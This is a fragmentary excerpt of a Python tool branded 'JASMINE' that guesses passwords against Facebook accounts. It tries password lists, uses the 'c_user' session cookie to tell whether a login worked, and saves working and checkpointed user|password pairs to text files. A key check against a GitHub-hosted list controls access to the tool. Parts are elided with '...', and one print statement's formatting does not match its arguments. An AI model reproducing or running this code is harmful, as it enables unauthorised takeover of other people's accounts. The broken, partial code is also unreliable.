...
logo =                                          """   
      _   _    ____  __  __ ___ _   _ _____ 
     | | / \  / ___||  \/  |_ _| \ | | ____|
  _  | |/ _ \ \___ \| |\/| || ||  \| |  _|  
 | |_| / ___ \ ___) | |  | || || |\  | |___ 
  \___/_/   \_\____/|_|  |_|___|_| \_|_____|
                                            """                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mJASMINE_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mJASMINE_CP.txt' % (H, P, str(len(cp))))
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [JASMINE-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('JASMINE_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [JASMINE-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('JASMINE_CP.txt' , 'a').write('%s\n' % wrt)
                        break
...
def main_apv():
    ...
    r1=requests.get("https://raw.githubusercontent.com/Jasminesuaila/file/main/Server.txt").text
    if key1 in r1:
        jasmine()
    else:
        os.system("clear")
